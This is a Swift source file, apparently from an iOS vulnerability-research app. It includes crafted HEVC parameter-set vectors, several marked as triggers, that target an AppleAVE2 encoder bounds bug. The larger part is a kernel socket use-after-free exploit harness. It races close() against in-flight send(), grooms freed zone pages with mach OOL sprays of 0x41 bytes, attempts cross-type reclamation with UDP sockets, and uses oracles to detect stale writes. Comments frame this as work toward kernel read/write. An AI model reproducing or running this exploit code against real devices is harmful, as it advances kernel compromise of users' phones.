    // and can be closed.  P1 validates the ABI, P2 measures whether closing the
    // client unlinks its registration node.  Add `--ionotifyrace` for the
    // bounded close/register race plus a public-API notify-walk trigger; that
    // variant is for the secondary device only.

    nonisolated func runIONotifyMode() {
        emitBg("[*] ionotify start (private-connection notify lifetime probe)")
        let race = ProcessInfo.processInfo.arguments.contains("--ionotifyrace")
        var rounds: Int32 = race ? 32 : 0
        run_ionotify_probe(rounds)
        emitBg("=== ionotify done (race=\(race ? "yes" : "no")) ===")
    }

    // ---- AVE / AppleAVE2 HEVC parameter-set encoder probe ------------------
    //
    // 27.2 adds AVE_HEVC_CheckVPSExtBounds plus five callers that validate VPS
    // layer-set and sub-layer counts derived from the caller's parameter sets;
    // the VPS parser itself is unchanged between builds, so the fix guards
    // consumption of those counts rather than parsing
    // (analysis/krw-leads/ave-vps-validation-cluster-2026-11-15.md).
    //
    // This probe answers one narrow question on device: do Annex-B parameter
    // sets built by the app reach AppleAVE2 through VTCompressionSessionCreate
    // at all? The detector is positive - the crafted VPS bytes must appear in
    // the encoder's own output stream if they were consumed.

    private struct AveVector {
        let name: String
        let hex: String
        let note: String
    }

    // Byte-identical to the vectors in carrier/AGXProbe/HEVCProbe.swift, which
    // were round-tripped against an independent RBSP parser.
    private static let aveVectors: [AveVector] = [
        AveVector(name: "base",
                  hex: "0000000140010c01ffff01600000030090000003000030078970240",
                  note: "control: layers=0 sub=0 sets=0"),
        AveVector(name: "vpsid15",
                  hex: "000000014001fc01ffff01600000030090000003000030078970240",
                  note: "control: VPS id 15 while SPS references id 0 - must fail"),
        AveVector(name: "sets17c",
                  hex: "0000000140010c01ffff01600000030090000003000030078970025ffff20",
                  note: "single layer, sets=17 (27.2 caps sets at 15)"),
        AveVector(name: "sub7",
                  hex: "0000000140010c0fffff016000000300900000030000300780000972e5cb972e5cb8120",
                  note: "vps_max_sub_layers_minus1=7 (27.2 caps at 6)"),
        AveVector(name: "lays63",
                  hex: "0000000140010ff1ffff0160000003009000000300003007897fd7fffffffffffffff90",
                  note: "vps_max_layers_minus1=63 (inconsistent with a 1-layer SPS)"),
        AveVector(name: "sets64c",
                  hex: "0000000140010c01ffff016000000300900000030000300789700083fffffffffffffffe4",
                  note: "TRIG: single layer, sets=64"),
        AveVector(name: "sets255c",
                  hex: "0000000140010c01ffff0160000003009000000300003007897000201fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffc80",
                  note: "TRIG: single layer, sets=255"),
        AveVector(name: "sets1023c",
                  hex: "0000000140010c01ffff01600000030090000003000030078970000801fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffc8",
                  note: "TRIG: single layer, sets=1023 (spec maximum)"),
    ]

    nonisolated func runAVEMode() {
        let args = ProcessInfo.processInfo.arguments
        let trig = args.contains("--avetrig")
        emitBg("[*] ave start (AppleAVE2 HEVC VPS validation cluster; trig=\(trig))")
        guard let baseSets = aveBaselineSets() else {
            emitBg("[-] ave: baseline capture failed")
            return
        }
        emitBg("[+] ave: baseline parameter sets \(baseSets.count) bytes")
        for v in Self.aveVectors where trig || !v.name.hasPrefix("sets") || v.name == "sets17c" {
            aveOne(vector: v, baselineSets: baseSets)
        }
        emitBg("=== ave done ===")
    }

    nonisolated private func aveBaselineSets() -> Data? {
        var session: VTCompressionSession?
        let st = VTCompressionSessionCreate(
            allocator: kCFAllocatorDefault,
            width: 64, height: 64,
            codecType: kCMVideoCodecType_HEVC,
            encoderSpecification: nil,
            imageBufferAttributes: nil,
            compressedDataAllocator: nil,
            outputCallback: { _, _, status, _, sb in
                gAveStatus = status; gAveSample = sb; gAveSem?.signal()
            },
            refcon: nil,
            compressionSessionOut: &session)
        guard st == noErr, let s = session else {
            emitBg("[-] ave baseline: create -> \(st)")
            return nil
        }
        var pb: CVPixelBuffer?
        _ = CVPixelBufferCreate(kCFAllocatorDefault, 64, 64,
                                kCVPixelFormatType_420YpCbCr8BiPlanarVideoRange, nil, &pb)
        guard let pix = pb else {
            emitBg("[-] ave baseline: pixel buffer create failed")
            VTCompressionSessionInvalidate(s)
            return nil
        }
        VTCompressionSessionPrepareToEncodeFrames(s)
        gAveStatus = -9999; gAveSample = nil
        let sem = DispatchSemaphore(value: 0); gAveSem = sem
        let rc = VTCompressionSessionEncodeFrame(
            s, imageBuffer: pix,
            presentationTimeStamp: CMTime(value: 0, timescale: 30),
            duration: .invalid, frameProperties: nil, infoFlagsOut: nil) { _, _, _ in }
        let waited = sem.wait(timeout: .now() + 6)
        _ = VTCompressionSessionCompleteFrames(s, untilPresentationTimeStamp: .invalid)
        var out: Data?
        if let sb = gAveSample, let fd = CMSampleBufferGetFormatDescription(sb) {
            out = Self.aveAnnexB(fd)
            let blk = CMSampleBufferGetDataBuffer(sb)
            emitBg("[*] ave baseline: rc=\(rc) cb=\(gAveStatus) dataLen=\(blk.map { CMBlockBufferGetDataLength($0) } ?? -1) paramSets=\(out?.count ?? -1)")
        } else {
            emitBg("[-] ave baseline: no sample (waited=\(waited == .success ? "yes" : "timeout"))")
        }
        VTCompressionSessionInvalidate(s)
        gAveSem = nil
        return out
    }

    nonisolated private func aveOne(vector v: AveVector, baselineSets baseSets: Data) {
        let crafted = Self.aveHex(v.hex)
        let patched = Self.aveSplice(base: baseSets, vps: crafted)
        emitBg("---- ave \(v.name): \(v.note), \(patched.count) bytes")
        guard let fd = Self.aveMakeFD(patched) else {
            emitBg("[-] ave \(v.name): CoreMedia rejected the parameter sets")
            return
        }
        emitBg("[+] ave \(v.name): format description accepted (\(Self.aveDescribe(fd))")
        var session: VTCompressionSession?
        let st = VTCompressionSessionCreate(
            allocator: kCFAllocatorDefault,
            width: 64, height: 64,
            codecType: kCMVideoCodecType_HEVC,
            encoderSpecification: nil,
            imageBufferAttributes: nil,
            compressedDataAllocator: nil,
            outputCallback: { _, _, status, _, sb in
                gAveStatus = status; gAveSample = sb; gAveSem?.signal()
            },
            refcon: nil,
            compressionSessionOut: &session)
        emitBg("[*] ave \(v.name): session -> \(st) (\(String(format: "0x%08x", UInt32(bitPattern: st))))")
        guard st == noErr, let s = session else { return }
        var pb: CVPixelBuffer?
        _ = CVPixelBufferCreate(kCFAllocatorDefault, 64, 64,
                                kCVPixelFormatType_420YpCbCr8BiPlanarVideoRange, nil, &pb)
        guard let pix = pb else { VTCompressionSessionInvalidate(s); return }
        VTCompressionSessionPrepareToEncodeFrames(s)
        gAveStatus = -9999; gAveSample = nil
        let sem = DispatchSemaphore(value: 0); gAveSem = sem
        let rc = VTCompressionSessionEncodeFrame(
            s, imageBuffer: pix,
            presentationTimeStamp: CMTime(value: 0, timescale: 30),
            duration: .invalid, frameProperties: nil, infoFlagsOut: nil) { _, _, _ in }
        _ = sem.wait(timeout: .now() + 6)
        _ = VTCompressionSessionCompleteFrames(s, untilPresentationTimeStamp: .invalid)

        var matched = false
        var outDesc = "none"
        var dataLen = -1
        if let sb = gAveSample, let blk = CMSampleBufferGetDataBuffer(sb) {
            dataLen = CMBlockBufferGetDataLength(blk)
            if let ofd = CMSampleBufferGetFormatDescription(sb) {
                outDesc = Self.aveDescribe(ofd)
            }
            // Consumed-parameter-set detector: does our crafted VPS body
            // (start code dropped) appear verbatim in the encoder's own
            // output bitstream? If yes, AppleAVE2 consumed our parameter set.
            let needle = Array(crafted.dropFirst(4))
            if needle.count >= 8, dataLen > 0 {
                let buf = UnsafeMutablePointer<UInt8>.allocate(capacity: dataLen)
                defer { buf.deallocate() }
                let cr = CMBlockBufferCopyDataBytes(blk, atOffset: 0,
                                                    dataLength: dataLen,
                                                    destination: UnsafeMutableRawPointer(buf))
                if cr == noErr {
                    outer: for i in 0...(dataLen - needle.count) {
                        var ok = true
                        for j in 0..<needle.count where buf[i + j] != needle[j] {
                            ok = false
                            break
                        }
                        if ok { matched = true; break outer }
                    }
                }
            }
        }
        emitBg("[*] ave \(v.name): encode rc=\(rc) cb=\(gAveStatus) dataLen=\(dataLen) outFD=[\(outDesc)] vpsInOutput=\(matched)")
        VTCompressionSessionInvalidate(s)
        gAveSem = nil
    }

    // MARK: AVE plumbing helpers

    nonisolated static func aveHex(_ s: String) -> Data {
        var bytes: [UInt8] = []
        var i = s.startIndex
        while i < s.endIndex {
            let j = s.index(i, offsetBy: 2, limitedBy: s.endIndex) ?? s.endIndex
            if let b = UInt8(s[i..<j], radix: 16) { bytes.append(b) }
            i = j
        }
        return Data(bytes)
    }

    /// Split Annex-B data into NAL bodies (start codes removed).
    nonisolated static func aveNALs(_ data: Data) -> [Data] {
        let bytes = [UInt8](data)
        var starts: [Int] = []
        var i = 0
        while i + 2 < bytes.count {
            if bytes[i] == 0, bytes[i + 1] == 0, bytes[i + 2] == 1 {
                starts.append(i + 3); i += 3
            } else { i += 1 }
        }
        guard !starts.isEmpty else { return [] }
        var out: [Data] = []
        for (k, s) in starts.enumerated() {
            let e = (k + 1 < starts.count) ? starts[k + 1] - 3 : bytes.count
            if e > s { out.append(Data(bytes[s..<e])) }
        }
        return out
    }

    nonisolated static func aveSplice(base: Data, vps: Data) -> Data {
        guard let vpsBody = aveNALs(vps).first else { return base }
        var out = Data()
        var replaced = false
        for nal in aveNALs(base) {
            guard let first = nal.first else { continue }
            if (first >> 1) & 0x3F == 32 {          // nal_unit_type 32 = VPS
                out.append(contentsOf: [0, 0, 0, 1]); out.append(vpsBody)
                replaced = true
            } else {
                out.append(contentsOf: [0, 0, 0, 1]); out.append(nal)
            }
        }
        if !replaced { out = Data([0, 0, 0, 1]) + vpsBody + out }
        return out
    }

    nonisolated static func aveAnnexB(_ fd: CMFormatDescription) -> Data {
        var count = 0
        guard CMVideoFormatDescriptionGetHEVCParameterSetAtIndex(
            fd, parameterSetIndex: 0, parameterSetPointerOut: nil,
            parameterSetSizeOut: nil, parameterSetCountOut: &count,
            nalUnitHeaderLengthOut: nil) == noErr, count > 0 else { return Data() }
        var out = Data()
        for i in 0..<count {
            var ptr: UnsafePointer<UInt8>? = nil
            var size = 0
            guard CMVideoFormatDescriptionGetHEVCParameterSetAtIndex(
                fd, parameterSetIndex: i, parameterSetPointerOut: &ptr,
                parameterSetSizeOut: &size, parameterSetCountOut: nil,
                nalUnitHeaderLengthOut: nil) == noErr,
                let p = ptr, size > 0 else { continue }
            out.append(contentsOf: [0, 0, 0, 1])
            out.append(p, count: size)
        }
        return out
    }

    nonisolated static func aveDescribe(_ fd: CMFormatDescription) -> String {
        var count = 0
        guard CMVideoFormatDescriptionGetHEVCParameterSetAtIndex(
            fd, parameterSetIndex: 0, parameterSetPointerOut: nil,
            parameterSetSizeOut: nil, parameterSetCountOut: &count,
            nalUnitHeaderLengthOut: nil) == noErr else { return "?" }
        var parts: [String] = []
        for i in 0..<count {
            var ptr: UnsafePointer<UInt8>? = nil
            var size = 0
            guard CMVideoFormatDescriptionGetHEVCParameterSetAtIndex(
                fd, parameterSetIndex: i, parameterSetPointerOut: &ptr,
                parameterSetSizeOut: &size, parameterSetCountOut: nil,
                nalUnitHeaderLengthOut: nil) == noErr, let p = ptr, size > 0 else { continue }
            let type = Int((p[0] >> 1) & 0x3F)
            var hex = ""
            for k in 0..<min(size, 6) { hex += String(format: "%02x", p[k]) }
            parts.append("#\(i) t\(type) \(size)B \(hex)")
        }
        return parts.joined(separator: " ")
    }

    nonisolated static func aveMakeFD(_ annexB: Data) -> CMFormatDescription? {
        let bodies = aveNALs(annexB)
        guard !bodies.isEmpty else { return nil }
        var owned: [UnsafeMutablePointer<UInt8>] = []
        var ptrs: [UnsafePointer<UInt8>] = []
        var sizes: [Int] = []
        defer { owned.forEach { $0.deallocate() } }
        for body in bodies {
            let n = max(body.count, 1)
            let p = UnsafeMutablePointer<UInt8>.allocate(capacity: n)
            body.withUnsafeBytes { raw in
                if let src = raw.baseAddress { memcpy(p, src, body.count) }
            }
            owned.append(p)
            ptrs.append(UnsafePointer(p))
            sizes.append(body.count)
        }
        var fmt: CMFormatDescription?
        let st = ptrs.withUnsafeBufferPointer { pp -> OSStatus in
            sizes.withUnsafeBufferPointer { ss -> OSStatus in
                CMVideoFormatDescriptionCreateFromHEVCParameterSets(
                    allocator: kCFAllocatorDefault,
                    parameterSetCount: bodies.count,
                    parameterSetPointers: pp.baseAddress!,
                    parameterSetSizes: ss.baseAddress!,
                    nalUnitHeaderLength: 4,
                    extensions: nil,
                    formatDescriptionOut: &fmt)
            }
        }
        return st == noErr ? fmt : nil
    }

    nonisolated func networkSurfaceProbe() {
        emitBg("[*] rawsock start (network-surface reachability)")
        let opened = network_surface_probe()
        emitBg("=== rawsock done: \(opened) families opened ===")
    }

    nonisolated func routeSocketProbe() {
        emitBg("[*] routesock start (PF_ROUTE bidirectionality + malformed sockaddr)")
        var st = [Int32](repeating: 0, count: 9)
        let err = route_socket_probe(&st)
        emitBg("[*] routesock stages(failures)=\(st[0]) \(st[1]) \(st[2]) \(st[3]) \(st[4]) \(st[5]) \(st[6]) \(st[7]) \(st[8]) firstErr=\(err)")
        emitBg("=== routesock done ===")
    }

    nonisolated func vmReclaimProbe() {
        emitBg("[*] reclaim start (VM deferred-reclamation MIG surface)")
        var st = [Int32](repeating: 0, count: 12)
        let rc = vm_reclaim_probe(&st)
        emitBg("[*] reclaim rc=\(rc) dlsym=\(st[0]) qpre_ok=\(st[1]) qpre_fail=\(st[2]) alloc=\(st[3]) qpost=\(st[4]) flush0=\(st[5]) resize=\(st[6]) flushMAX=\(st[7])")
        emitBg("=== reclaim done ===")
    }

    nonisolated func sockUafPeerBytes(_ precPort: Int, _ peers: inout [Int32],
                                      _ peerLock: NSLock) -> Int {
        let probe = sockUafSprayConnected(48, precPort)
        var got = 0
        var rbuf = [UInt8](repeating: 0, count: 65536)
        peerLock.lock()
        let snapshot = peers
        peers.removeAll()
        peerLock.unlock()
        for pf in snapshot {
            var r = recv(pf, &rbuf, rbuf.count, MSG_DONTWAIT)
            while r > 0 {
                got += r
                if got > 0x100000 { break }
                r = recv(pf, &rbuf, rbuf.count, MSG_DONTWAIT)
            }
        }
        for pf in snapshot { close(pf) }
        for fd in probe { close(fd) }
        return got
    }

    // Cross-zone race: same gate/close as precision, but the freed slot is
    // refilled with mach OOL pages (attacker bytes, not sockets). If the stale
    // send lands in an OOL page the kernel walks 0x41 fill as socket fields;
    // the run usually panics instead of reporting a clean hit.
    nonisolated func sockUafRaceCrossZone(_ st: SockUafState, _ target: Int32,
                                          _ it: Int, _ spraySize: Int,
                                          _ sprayCount: Int, _ precPort: Int,
                                          _ peers: inout [Int32], _ peerLock: NSLock) -> Bool {
        let n = 6
        // Optional: starve the send buffer so sosend takes the sblock/sbwait paths
        // where the missing usecount check actually lives.
        if ProcessInfo.processInfo.arguments.contains("--socklowbuf") {
            var small: Int32 = 512
            setsockopt(target, SOL_SOCKET, SO_SNDBUF, &small,
                       socklen_t(MemoryLayout<Int32>.size))
        }
        st.fd = target
        st.done = 0
        st.entered = 0
        st.phase = 1
        st.mode = 1
        usleep(60)
        st.gate = 1
        var e = 0
        while st.entered < Int32(n) && e < 200_000 { e &+= 1 }
        st.phase = 2
        var spins = 0
        while st.phase != 3 && spins < 400_000 { spins &+= 1 }
        if st.phase != 3 {
            if OSAtomicCompareAndSwap32(2, 3, &st.p[1]) { close(target) }
        }
        let doneAtClose = st.done
        // Observer: a batch of connected sockets with a pre-established peer lets us
        // see whether the stale send landed in a *socket* (bytes arrive at the peer)
        // rather than in our OOL data. Nothing is sent on these, so any delivery at
        // all is stale-sender data.
        let probe = sockUafSprayConnected(48, precPort)
        sockuaf_ool_reset()
        let sprayed = sockuaf_ool_spray(spraySize, Int32(sprayCount), 0x41)
        var w = 0
        while st.done < Int32(n) && w < 200_000 { w &+= 1 }
        st.gate = 0
        st.phase = 0
        st.fd = -1
        st.mode = 0
        usleep(120)
        var got = 0
        var rbuf = [UInt8](repeating: 0, count: 65536)
        peerLock.lock()
        let snapshot = peers
        peers.removeAll()
        peerLock.unlock()
        for pf in snapshot {
            var r = recv(pf, &rbuf, rbuf.count, MSG_DONTWAIT)
            while r > 0 {
                got += r
                if got > 0x100000 { break }
                r = recv(pf, &rbuf, rbuf.count, MSG_DONTWAIT)
            }
        }
        for pf in snapshot { close(pf) }
        for fd in probe { close(fd) }
        emitBg("[*] ITER \(it) crosszone: sprayed \(sprayed)x\(spraySize) OOL, peer bytes=\(got), senders done=\(st.done) (at close \(doneAtClose)/6)")
        if got > 0 {
            emitBg("[!] ITER \(it) crosszone: *** STALE WRITE into a socket: \(got) byte(s) ***")
            return true
        }
        return false
    }

    // Page-free race: allocate a block of adjacent sockets, race the middle
    // one, then free the whole block so its zone page(s) go back to the page
    // allocator, and immediately take them with OOL pages. Only if a whole
    // page is freed can non-socket data land in the target slot.
    nonisolated func sockUafRacePageFree(_ st: SockUafState, _ fds: [Int32], _ targetIdx: Int,
                                         _ it: Int, _ sprayCount: Int, _ precPort: Int,
                                         _ peers: inout [Int32], _ peerLock: NSLock) -> Bool {
        let target = fds[targetIdx]
        st.fd = target
        st.done = 0
        st.entered = 0
        st.phase = 1
        st.mode = 1
        usleep(60)
        st.gate = 1
        var e = 0
        while st.entered < 6 && e < 200_000 { e &+= 1 }
        st.phase = 2
        var spins = 0
        while st.phase != 3 && spins < 400_000 { spins &+= 1 }
        if st.phase != 3 {
            if OSAtomicCompareAndSwap32(2, 3, &st.p[1]) { close(target) }
        }
        let doneAtClose = st.done
        let peerBytes = sockUafPeerBytes(precPort, &peers, peerLock)
        for (i, fd) in fds.enumerated() where i != targetIdx && fd >= 0 { close(fd) }
        sockuaf_ool_reset()
        let sprayed = sockuaf_ool_spray(oolSpraySize(), Int32(sprayCount), 0x41)
        // Re-arm immediately: OOL gets first shot at any returned page, the new
        // sockets take whatever is left, so the stale sender must not land on
        // its own old page unless it was never returned.
        for _ in 0..<fds.count {
            let f = sockUafMakeSocket("127.0.0.1", 8080)
            if f >= 0 { close(f) }
        }
        var w = 0
        while st.done < 6 && w < 200_000 { w &+= 1 }
        st.gate = 0
        st.phase = 0
        st.fd = -1
        st.mode = 0
        usleep(120)
        emitBg("[*] ITER \(it) pagefree: \(fds.count) freed, sprayed \(sprayed)x\(oolSpraySize()) OOL, peer bytes=\(peerBytes), done=\(st.done) (at close \(doneAtClose)/6)")
        if peerBytes > 0 {
            emitBg("[!] ITER \(it) pagefree: *** STALE WRITE into a socket: \(peerBytes) byte(s) ***")
        }
        return st.postCloseOk > 0 || peerBytes > 0
    }

    // GC race: free a large batch (past the zone's page-return delay), not just
    // one page, so the freed socket pages actually leave the zone. Then take
    // them with OOL pages. A stale sender that lands in OOL data dereferences
    // 0x4141… as so_proto and should fault.
    nonisolated func sockUafRaceBatchGC(_ st: SockUafState, _ make: Int, _ free: Int,
                                        _ it: Int, _ sprayCount: Int, _ precPort: Int,
                                        _ peers: inout [Int32], _ peerLock: NSLock) -> Bool {
        var fds: [Int32] = []
        for _ in 0..<make { let f = sockUafMakeSocket("127.0.0.1", 8080); if f >= 0 { fds.append(f) } }
        if fds.count < 8 { for f in fds { close(f) }; return false }
        let target = fds[fds.count / 2]
        st.fd = target
        st.done = 0
        st.entered = 0
        st.phase = 1
        st.mode = 1
        usleep(60)
        st.gate = 1
        var e = 0
        while st.entered < 6 && e < 200_000 { e &+= 1 }
        st.phase = 2
        var spins = 0
        while st.phase != 3 && spins < 400_000 { spins &+= 1 }
        if st.phase != 3 {
            if OSAtomicCompareAndSwap32(2, 3, &st.p[1]) { close(target) }
        }
        let doneAtClose = st.done
        let peerBytes = sockUafPeerBytes(precPort, &peers, peerLock)
        // Free everything except the target (already closed by the CAS winner).
        for f in fds where f != target { close(f) }
        fds.removeAll()
        sockuaf_ool_reset()
        let sprayed = sockuaf_ool_spray(oolSpraySize(), Int32(sprayCount), 0x41)
        var w = 0
        while st.done < 6 && w < 200_000 { w &+= 1 }
        st.gate = 0
        st.phase = 0
        st.fd = -1
        st.mode = 0
        usleep(80)
        emitBg("[*] ITER \(it) batchgc: made/closing \(free), sprayed \(sprayed)x\(oolSpraySize()) OOL, peer bytes=\(peerBytes), done=\(st.done) (at close \(doneAtClose)/6)")
        if peerBytes > 0 {
            emitBg("[!] ITER \(it) batchgc: *** STALE WRITE into a socket: \(peerBytes) byte(s) ***")
        }
        return st.postCloseOk > 0 || peerBytes > 0
    }

    // Precision race: every sender fires exactly one message from a gate, the
    // close lands inside that burst, then the slot is refilled with connected
    // sockets. Bytes seen at the precision peers == stale write.
    // Connected UDP spray: same zone, different proto/sw layout. A stale TCP
    // send operating on a reclaimed dgram socket is a type confusion; the
    // observable is a panic or an odd errno rather than peer bytes.
    nonisolated func sockUafSprayUdp(_ n: Int, _ port: Int) -> [Int32] {
        var fds: [Int32] = []
        var addr = sockaddr_in()
        addr.sin_family = sa_family_t(AF_INET)
        addr.sin_port = in_port_t(UInt16(port).bigEndian)
        inet_pton(AF_INET, "127.0.0.1", &addr.sin_addr)
        for _ in 0..<n {
            let fd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)
            if fd < 0 { break }
            _ = withUnsafePointer(to: &addr) { q in
                q.withMemoryRebound(to: sockaddr.self, capacity: 1) { sa in
                    connect(fd, sa, socklen_t(MemoryLayout<sockaddr_in>.size))
                }
            }
            fds.append(fd)
        }
        return fds
    }

    nonisolated func sockUafRacePrecision(_ st: SockUafState, _ target: Int32,
                                              _ it: Int, _ precPort: Int,
                                              _ peers: inout [Int32], _ peerLock: NSLock,
                                              _ udp: Bool = false, _ mixUdp: Bool = false,
                                                                                        _ udpPort: Int = 0, _ udpListener: Int32 = -1) -> Int {
        let n = 6
        st.fd = target
        st.done = 0
        st.entered = 0
        st.phase = 1
        st.mode = 1
        usleep(60)                       // let every sender park on the gate
        st.gate = 1                      // burst
        // Close only once every sender has crossed into its syscall, so no
        // sender can still be looking the fd up afterwards.
        var e = 0
        while st.entered < Int32(n) && e < 200_000 { e &+= 1 }
        st.phase = 2
        var spins = 0
        while st.phase != 3 && spins < 400_000 { spins &+= 1 }
        if st.phase != 3 {
            if OSAtomicCompareAndSwap32(2, 3, &st.p[1]) { close(target) }
        }
        let doneAtClose = st.done
        var mixMade = 0
        var mixFds: [Int32] = []
        var udpAddr = sockaddr_in()
        if mixUdp {
            udpAddr.sin_family = sa_family_t(AF_INET)
            udpAddr.sin_port = in_port_t(UInt16(udpPort).bigEndian)
            inet_pton(AF_INET, "127.0.0.1", &udpAddr.sin_addr)
        }
        // Critical window FIRST. In cross-type mode the hammer must be allocating
        // datagram sockets while the stale senders may still be inside their
        // syscall; doing the TCP spray first would let 48 fresh TCP sockets take
        // every freed slot before the window even opens.
        var w = 0
        if mixUdp {
            while st.done < Int32(n) && w < 200_000 && mixFds.count < 256 {
                let u = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)
                if u < 0 { break }
                _ = withUnsafePointer(to: &udpAddr) { q in
                    q.withMemoryRebound(to: sockaddr.self, capacity: 1) { sa in
                        connect(u, sa, socklen_t(MemoryLayout<sockaddr_in>.size))
                    }
                }
                mixFds.append(u)
                mixMade += 1
                w &+= 1
            }
        }
        let spray = udp ? sockUafSprayUdp(48, precPort) : sockUafSprayConnected(48, precPort)
        // Contend: make the new owner of each slot send on top of the stale
        // sender so two paths touch the same sockbuf without the lock.
        var one: UInt8 = 0x42
        for _ in 0..<3 {
            for fd in spray { _ = send(fd, &one, 1, MSG_DONTWAIT) }
        }
        while st.done < Int32(n) && w < 400_000 { w &+= 1 }
        st.gate = 0
        st.phase = 0
        st.fd = -1
        st.mode = 0
        usleep(150)
        // Drain every peer of the spray sockets.
        var got = 0
        var rbuf = [UInt8](repeating: 0, count: 65536)
        peerLock.lock()
        let snapshot = peers
        peers.removeAll()
        peerLock.unlock()
        for pf in snapshot {
            var r = recv(pf, &rbuf, rbuf.count, MSG_DONTWAIT)
            while r > 0 {
                got += r
                if got > 0x100000 { break }
                r = recv(pf, &rbuf, rbuf.count, MSG_DONTWAIT)
            }
        }
        for pf in snapshot { close(pf) }
        for fd in spray { close(fd) }
        // Drain the datagram oracle. Any datagram here was transmitted by a
        // socket we never sent on, so it can only be the stale sender's bytes
        // being pushed out through a reclaimed dgram socket.
        var udgrams = 0
        var ubytes = 0
        if mixUdp && udpListener >= 0 {
            var ubuf = [UInt8](repeating: 0, count: 65536)
            while true {
                let r = recv(udpListener, &ubuf, ubuf.count, MSG_DONTWAIT)
                if r <= 0 { break }
                udgrams += 1
                ubytes += r
            }
            for u in mixFds { close(u) }
        }
        if udgrams > 0 {
            emitBg("[!] ITER \(it) precision/mix: *** CROSS-TYPE HIT: \(udgrams) datagram(s)/\(ubytes) byte(s) via a reclaimed dgram socket (hammer alloc=\(mixMade), in flight at close \(doneAtClose)/6) ***")
            return 2
        }
        if mixUdp && it % 20 == 0 {
            emitBg("[*] ITER \(it) precision/mix: hammer alloc=\(mixMade), tcpPeerBytes=\(got) baseline=\(3 * spray.count)")
        }
        // The contention sends themselves put 3 bytes on every peer; only
        // anything beyond that baseline can be stale sender data.
        let baseline = 3 * spray.count
        if got > baseline + 512 || (udp && st.postCloseOk > 0) {
            emitBg("[!] ITER \(it) precision\(udp ? "/udp" : ""): *** STALE WRITE: \(got) byte(s) (sends in flight at close: \(doneAtClose)/6, afterCloseOk: \(st.postCloseOk)) ***")
            return 1
        }
        return 0
    }

    nonisolated func sockUafCheck(_ fds: [Int32], _ st: SockUafState) -> Bool {
        for fd in fds {
            var optval: Int32 = 0
            var optlen = socklen_t(MemoryLayout<Int32>.size)
            let r = getsockopt(fd, SOL_SOCKET, SO_TYPE, &optval, &optlen)
            if r < 0 {
                if errno != EBADF { return true }
            } else if optval != Int32(SOCK_STREAM) {
                return true
            }
            var sb: Int32 = 0
            var sl = socklen_t(MemoryLayout<Int32>.size)
            if getsockopt(fd, SOL_SOCKET, SO_SNDBUF, &sb, &sl) == 0 && sb == 0 {
                return true
            }
            // The spray sockets are fresh and never sent on: any queued send
            // bytes (SO_NWRITE) or pending error means a stale sender wrote here.
            var nw: Int32 = 0
            var nl = socklen_t(MemoryLayout<Int32>.size)
            if getsockopt(fd, SOL_SOCKET, 0x1021, &nw, &nl) == 0 {
                if nw > st.nwMax { st.nwMax = nw }
                if nw != 0 { return true }
            }
            var er: Int32 = 0
            var el = socklen_t(MemoryLayout<Int32>.size)
            if getsockopt(fd, SOL_SOCKET, SO_ERROR, &er, &el) == 0 && er != 0 {
                return true
            }
        }
        return false
    }

    // One hammer-race: senders are already spinning, the closer fires at a
    // random point while they are in-kernel, then we spray and check.
    nonisolated func sockUafRaceOnce(_ st: SockUafState, _ target: Int32, _ sprayCount: Int,
                         _ it: Int, _ tag: String) -> Bool {
        st.postCloseOk = 0
        st.odd = 0
        st.uafProbe = 0
        st.staleWrite = 0
        st.staleRead = 0
        st.fd = target
        st.phase = 1
        // Keep the senders inside send() for a random slice, then close.
        usleep(UInt32.random(in: 30...600))
        st.phase = 2
        var spins = 0
        while st.phase != 3 && spins < 400_000 { spins &+= 1 }
        if st.phase != 3 {
            // Closer starved: win the transition ourselves and close here.
            if OSAtomicCompareAndSwap32(2, 3, &st.p[1]) { close(target) }
        }
        let afterCloseOk = st.postCloseOk   // successes before any spray reuse
        let uafProbe = st.uafProbe
        let staleW = st.staleWrite
        let staleR = st.staleRead
        // No delay: refill the freed slot while senders are still in-kernel so a
        // stale sender lands in a *fresh* socket, not stale-but-valid memory.
        let spray = sockUafSpray(sprayCount)
        usleep(150)
        var corrupt = sockUafCheck(spray, st)
        // Extra oracle: a replaced slot used as a socket may answer
        // getsockname() with a bogus family.
        if !corrupt {
            for fd in spray {
                var addr = sockaddr_in()
                var al = socklen_t(MemoryLayout<sockaddr_in>.size)
                let r = withUnsafeMutablePointer(to: &addr) { p -> Int32 in
                    p.withMemoryRebound(to: sockaddr.self, capacity: 1) { sa in
                        getsockname(fd, sa, &al)
                    }
                }
                if r == 0 && addr.sin_family != sa_family_t(AF_INET) {
                    emitBg("[!] ITER \(it) \(tag): getsockname family=\(addr.sin_family) on spray fd")
                    corrupt = true
                    break
                }
            }
        }
        st.phase = 0
        st.fd = -1
        usleep(15)
        for fd in spray { close(fd) }
        if corrupt { emitBg("[!] ITER \(it) \(tag): *** CORRUPTION DETECTED ***") }
        if afterCloseOk > 0 && (it % 10 == 0 || afterCloseOk > 2) {
            emitBg("[*] ITER \(it) \(tag): \(afterCloseOk) send(s) returned success after close()")
        }
        if uafProbe > 0 && (staleW > 0 || it % 25 == 0) {
            emitBg("[!] ITER \(it) \(tag): *** UAF PROBE stale=read:\(staleR)/write:\(staleW) ***")
        }
        if st.odd > 0 && (it % 10 == 0 || st.odd > 500) {
            let e = st.lastErr
            emitBg("[?] ITER \(it) \(tag): \(st.odd) odd errno(s), last=\(e) (\(String(cString: strerror(e))))")
        }
        return corrupt
    }

    // ---- Reclaimed-datagram field differential (--sockfield) -----------------
    //
    // `--sockmix` proved the freed TCP slot can be taken by a SOCK_DGRAM socket
    // and that stale sender bytes come out as UDP datagrams, but never read any
    // kernel field on the reclaimed object. This mode runs the same precision
    // race + in-window datagram hammer, then fingerprints every hammer-created
    // fd through the API (SO_TYPE/SO_ERROR/SO_SNDBUF/SO_RCVBUF/TCP_CONNECTION_INFO/
    // getsockname) and diffs each against a control set of fresh, never-raced
    // dgram sockets. A field outside the baseline is a controlled field.

    nonisolated func runSockFieldMode() async {
        await MainActor.run { self.isRunning = true; self.status = "SockField..."; self.log = "" }
        try? "".write(to: logFileURL, atomically: true, encoding: .utf8)
        emitBg("=== sockfield: reclaimed datagram socket field differential ===")
        signal(SIGPIPE, SIG_IGN)
        let ip = "127.0.0.1"
